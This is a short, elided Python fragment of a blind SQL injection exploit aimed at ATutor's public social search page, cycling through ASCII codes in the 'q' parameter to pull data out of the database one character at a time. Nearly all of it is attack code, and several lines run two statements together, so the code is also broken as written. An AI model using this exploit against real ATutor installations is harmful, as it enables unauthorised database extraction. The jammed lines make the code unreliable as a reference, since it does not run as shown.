...
def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126): # now we update the sqli
        target = "http://%s/atutor/mods/_standard/social/index_public.php?q=%s" % (ip,  inj_str.replace("[CHAR]", str(j))) r = requests.get(target)
...
def main():
    ...
    for i in range(1, 20):
        ...
        sys.stdout.write(extracted_char) sys.stdout.flush()
        print "\n(+) done!" 
